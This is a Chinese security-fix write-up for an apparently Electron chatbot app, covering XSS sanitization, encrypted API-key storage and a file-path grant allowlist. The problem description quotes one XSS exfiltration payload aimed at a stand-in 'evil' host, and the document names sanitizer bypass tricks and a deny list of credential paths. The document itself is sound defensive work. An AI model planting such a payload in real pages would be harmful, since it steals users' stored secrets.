# 安全加固说明（XSS / API Key / 磁盘权限）

本次修复针对三个会导致「企业安全评估一票否决」的问题。三条防线互相独立，任一条被绕过仍不至于全盘失守。

---

## 1. 渲染链：不可信 HTML 一律白名单净化

**问题**：`renderMarkdown()` 把 `marked.parse()` 的结果直接写进 `innerHTML`。
模型输出 / 文档正文 / 网页抓取内容都算不可信输入，一个
`<img src=x onerror="fetch('//evil?'+localStorage.chatbotStore)">` 就能读走密钥，
再借 `fileAPI` 写磁盘。

**修复**
| 文件 | 改动 |
|---|---|
| `renderer/sanitize.js`（新增） | 零依赖 **白名单重建** 净化器：只保留允许的标签；`script/style/iframe/svg/math/form…` 连内容丢弃；`on*`、`id`、`name`（防 DOM Clobbering）、`srcset`、`formaction` 全部剔除；`href/src` 只放行 http/https/mailto/tel/#/相对路径，图片额外放行 `data:image/*;base64`；`style` 命中 `url()/expression()/javascript:/position:fixed` 整条丢弃；输出只由「转义文本 + 白名单标签」拼装，解析歧义也不会漏出原始 `<`。 |
| `renderer/index.html` | 在 `approval.js` 之后加载 `sanitize.js`（早于所有业务脚本）。 |
| `renderer/assets/js/12-render.js` | `renderMarkdown()` 先 `SafeHtml.sanitizeHtml(marked.parse(src))` 再进 DOM；净化器缺失时 **fail-closed**（降级为纯文本）；会话图片附件也走 `isSafeUrl` 校验。 |

**验证**：`node --test renderer/sanitize.test.js`（15 项，覆盖 script 剥离、事件属性、
`&#106;avascript:` 实体绕过、`java\nscript:` 控制字符绕过、style 注入、DOM Clobbering、未闭合标签兜底）。

---

## 2. API Key：不再明文进 localStorage

**问题**：`chatbotStore.apiKey` 明文存 `localStorage`，任何 XSS 或同源脚本可直读。

**修复**
| 文件 | 改动 |
|---|---|
| `main.js` | 新增 `secret:set / secret:remove / secret:status / secret:get-sync / secret:status-sync`：
用 Electron **`safeStorage`**（Windows DPAPI / macOS Keychain / Linux libsecret）加密后写入
`<userData>/secrets.json`，文件权限 `0600`，原子写（tmp + rename）。系统不支持加密时
**拒绝落盘**（返回 `unavailable`），绝不退化为明文。名称白名单 `^[A-Za-z0-9_.:-]{1,80}$`。 |
| `preload.js` | 新增 `secretAPI`（`available / backend / getSync / set / remove / status`），仅工作台页面可用（主进程二次校验 `isTrustedSender`）。 |
| `renderer/assets/js/01-core.js` | 新增 `secretStore`：Electron 走 `secretAPI`；无安全存储时只保留 **本次会话内存**。 |
| `renderer/assets/js/08-ui-store.js` | `saveChatbot()` 改为「快照剥离」：密钥先写 safeStorage，再从 `localStorage` 快照里清空（主对象仍持有内存副本，请求不受影响）；新增 `hydrateSecrets()` 启动时取回密钥，并把历史明文密钥**一次性迁移**进 safeStorage 后抹掉 localStorage 明文。`providers[].apiKey` 同样处理。 |
| `renderer/assets/js/14-ui-dialogs.js` | 系统不支持安全存储且用户填写了 Key → 明确提示「仅本次会话内存」；`resetState()` 同时清除密钥。 |

> 兼容性：纯浏览器直开（无 `secretAPI`）时密钥只存在内存，刷新即失效——这是有意的取舍，
> 不提供「明文持久化」开关。

---

## 3. fileAPI：默认零授权的路径白名单

**问题**：`preload.fileAPI` 暴露 `read/write/rm/walk` 且无路径限制，等于把整块磁盘交给页面。

**修复**
| 文件 | 改动 |
|---|---|
| `fs-grant.js`（新增） | 授权模型：`file`（精确路径）/ `dir`（子树）；路径归一化（Windows/macOS 大小写不敏感、`..` 折叠、尾分隔符）；**永久拒绝**系统目录（Windows/Program Files、`/etc`、`/usr`、`/System`…）、密钥与凭据（`.ssh`、`.gnupg`、`.aws`、`.kube`、`Login Data`、`Cookies`…）以及**应用自身配置目录**（`userData`，防篡改 `secrets.json` / `fs-grants.json`）。 |
| `main.js` | ① 所有 `fs:*` 与 `kb:scan` 统一走 `assertFsAccess()`（受信来源校验 + `realpath` 解析，防 symlink 逃逸，目标不存在时用父目录 realpath）；② `fs:grant` 对**未授权**路径弹**原生确认框**（防止页面脚本自行 `grant('C:\Users\me')` 扩权），已在授权范围则静默通过；③ 授权持久化到 `<userData>/fs-grants.json`（0600）；④ `kb:pick-dir` 选中的目录视为用户显式授权。 |
| `preload.js` | `fileAPI` 增加 `grant / grantDropped / grants / revokeGrants`。 |
| `renderer/drop-grant.js`（新增） | 拖入路径「免确认授权」的证明校验：每条待授权路径必须**等于某条真实拖入文件路径、或是它的祖先目录**（拖入文件夹时一次授权整个目录）。证明路径来自 `webUtils.getPathForFile()`，对渲染层 `new File()` 合成的对象只返回空串，脚本无法伪造。 |
| `renderer/assets/js/17-pgpy-fsui.js` | 拖入文件/文件夹时优先调 `grantDropped({ paths, proofs })` **免原生确认框**批量授权（`proofs` = 拖入 File 的真实路径）；拿不到任何真实路径时（如目录选择器派生的 File 无磁盘路径）回退旧的逐条 `grant`，仍由确认框兜底；被拒绝只告警、不中断导入。 |

**行为变化（需告知用户）**：拖入文件/文件夹即可直接读写、同步回磁盘，**不再每次弹「路径授权」确认框**；
其他来源（脚本自行调用）仍受零授权 + 原生确认框约束。未授权路径返回 `EPERM_NO_GRANT` 并附带中文可读原因。

**验证**：`node --test fs-grant.test.js renderer/drop-grant.test.js`（fs-grant 9 项：默认零授权、目录子树、单文件、
大小写/`..` 归一化、敏感路径、系统目录、相对路径拒绝、POSIX、revoke；drop-grant 10 项：单文件、目录、无证明拒绝、
越界证明拒绝、祖先/子路径边界、大小写与 `..` 归一化、相对/空路径、POSIX、兄弟目录前缀、重复去重）。

---

## 回归与未覆盖项

- 全量单测：`npm test` → 174 项全部通过（新增 24 项）。
- 仍建议在真实 Electron 环境手工验证：拖入文件夹 → 确认框 → 同步写回 → 撤销授权后写回应失败。
- 尚未处理（后续项）：`marked` 之外的自研 HTML 拼接（如 Office 编辑器导入 docx 的 HTML）、
  远程 MCP 返回富文本的渲染、代码签名与自动更新通道。
